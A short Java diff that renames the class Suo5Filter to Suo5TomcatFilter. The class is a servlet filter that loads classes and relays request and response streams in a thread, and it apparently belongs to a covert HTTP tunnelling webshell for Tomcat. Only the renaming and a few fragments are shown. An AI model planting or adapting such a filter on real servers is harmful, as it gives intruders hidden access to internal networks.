@@ -22,7 +22,7 @@ import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 
-public class Suo5Filter extends ClassLoader implements Filter, Servlet, ServletConfig , Runnable, HostnameVerifier, X509TrustManager{
+public class Suo5TomcatFilter extends ClassLoader implements Filter, Servlet, ServletConfig , Runnable, HostnameVerifier, X509TrustManager{
     private static FilterConfig filterConfig;
     private HashMap parameterMap;
     private ServletContext servletContext;
@@ -37,14 +37,14 @@ public class Suo5Filter extends ClassLoader implements Filter, Servlet, ServletC
     OutputStream gOutStream;
 
 
-    public Suo5Filter() {
+    public Suo5TomcatFilter() {
     }
 
-    public Suo5Filter(ClassLoader loader) {
+    public Suo5TomcatFilter(ClassLoader loader) {
         super(loader);
     }
 
-    public Suo5Filter(InputStream in, OutputStream out) {
+    public Suo5TomcatFilter(InputStream in, OutputStream out) {
         this.gInStream = in;
         this.gOutStream = out;
     }
@@ -332,7 +332,7 @@ public class Suo5Filter extends ClassLoader implements Filter, Servlet, ServletC
 
         Thread t = null;
         try {
-            Suo5Filter p = new Suo5Filter(scInStream, respOutStream);
+            Suo5TomcatFilter p = new Suo5TomcatFilter(scInStream, respOutStream);
             t = new Thread(p);
             t.start();
             readReq(reqInputStream, scOutStream);
